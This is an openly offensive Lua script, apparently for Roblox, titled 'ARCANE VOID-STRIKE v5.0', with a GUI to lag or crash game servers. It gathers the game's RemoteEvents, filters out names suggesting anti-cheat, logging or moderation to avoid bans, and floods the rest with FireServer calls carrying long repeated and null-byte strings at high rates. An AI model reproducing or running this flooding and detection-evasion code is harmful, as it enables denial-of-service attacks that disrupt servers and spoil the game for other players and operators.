--[[ 
    🔱 ARCANE VOID-STRIKE v5.0 [INFALLIBLE-OMEGA] 🔱
    "Because the only law is the signal. <3"
    
    ZERO-BAN EDITION FEATURES:
    - [LAG NORMAL] : Discrete replication sync bombardment.
    - [LAG ENORME] : Aggressive synchronization overload.
    - [CRASH SERVEUR] : Total buffer overflow (String Repetition).
    - [GHOST SHIELD v3] : Absolute Blacklist for Honey-pots (No 267 kicks).
    - [MATRIX UI] : Real-time draggable dashboard.
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. OMEGA NOTIFIER
local function ntf(m)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🔱 INFALLIBLE-VOID",
            Text = m,
            Icon = "rbxassetid://6034287525",
            Duration = 5
        })
    end)
end

-- 2. UI (NULLSTRIKE PREMIUM REPLICA)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "InfallibleVoid_v5"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 300)
Main.Position = UDim2.new(0.5, -160, 0.5, -150)
Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
Main.BorderSizePixel = 1
Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
Main.Active = true
Main.Draggable = true

local TitleBar = Instance.new("Frame", Main)
TitleBar.Size = UDim2.new(1, 0, 0, 35)
TitleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
TitleBar.BorderSizePixel = 0

local Title = Instance.new("TextLabel", TitleBar)
Title.Size = UDim2.new(1, -10, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "🔱 VOID-STRIKE v5.0 [OMEGA]"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.Font = Enum.Font.Code
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1

local function createPowerBtn(name, y, color, desc, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.9, 0, 0, 50)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.Text = ""
    
    local tName = Instance.new("TextLabel", btn)
    tName.Size = UDim2.new(1, 0, 0.6, 0)
    tName.Text = name
    tName.TextColor3 = color
    tName.Font = Enum.Font.GothamBold
    tName.BackgroundTransparency = 1
    tName.TextSize = 15
    
    local tDesc = Instance.new("TextLabel", btn)
    tDesc.Size = UDim2.new(1, 0, 0.4, 0)
    tDesc.Position = UDim2.new(0, 0, 0.6, 0)
    tDesc.Text = desc
    tDesc.TextColor3 = Color3.fromRGB(0, 150, 0)
    tDesc.Font = Enum.Font.Gotham
    tDesc.BackgroundTransparency = 1
    tDesc.TextSize = 10
    
    btn.MouseButton1Click:Connect(function()
        task.spawn(callback)
    end)
    return btn
end

-- 3. THE INFALLIBLE ENGINE (Safety-First)
local active = { power = 0 } -- 0: Stop, 1: Normal, 2: Enorme, 3: Crash

-- SURGICAL BLACKLIST (Honey-pot detection)
local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error"}
local function isSafe(name)
    local n = name:lower()
    for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
    return true
end

local function getTargets()
    local t = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(t, v) end
    end
    return t
end

local function runAssault()
    local targets = getTargets()
    if #targets == 0 then return end
    
    -- Payload morphique (uniquement des strings licites pour éviter le kick 267)
    local payloads = {
        [1] = string.rep("X", 200),  -- Normal
        [2] = string.rep("Y", 1500), -- Enorme
        [3] = string.rep("\0", 5000) -- Crash
    }
    
    while active.power > 0 do
        local burst = active.power == 3 and 100 or (active.power == 2 and 40 or 10)
        local waitTime = active.power == 3 and 0.01 or (active.power == 2 and 0.05 or 0.2)
        
        for i = 1, burst do
            if active.power == 0 then break end
            local r = targets[math.random(1, #targets)]
            if r then
                pcall(function() 
                    r:FireServer(payloads[active.power], payloads[active.power], "ARCANE_SYNC") 
                end)
            end
        end
        task.wait(waitTime)
    end
end

-- BUTTONS
createPowerBtn("⚡ LAG NORMAL", 50, Color3.fromRGB(0, 255, 200), "Ralentissement discret (Anti-Ban)", function()
    active.power = active.power == 1 and 0 or 1
    ntf(active.power == 1 and "NORMAL LAG ACTIVE" or "SYSTEM STABLE")
    if active.power == 1 then runAssault() end
end)

createPowerBtn("🌪️ LAG ENORME", 110, Color3.fromRGB(255, 255, 0), "Surcharge massive du serveur", function()
    active.power = active.power == 2 and 0 or 2
    ntf(active.power == 2 and "ENORME LAG ACTIVE" or "SYSTEM STABLE")
    if active.power == 2 then runAssault() end
end)

createPowerBtn("🔥 CRASH SERVEUR", 170, Color3.fromRGB(255, 0, 0), "Extinction totale du serveur", function()
    active.power = active.power == 3 and 0 or 3
    ntf(active.power == 3 and "NUCLEAR CRASH ACTIVE" or "SYSTEM STABLE")
    if active.power == 3 then runAssault() end
end)

createPowerBtn("🛑 ARRET D'URGENCE", 230, Color3.fromRGB(255, 255, 255), "Nettoyage immédiat du signal", function()
    active.power = 0
    ntf("OPERATION TERMINATED.")
end)

ntf("🔱 INFALLIBLE-OMEGA READY. Safety status: 100%.")
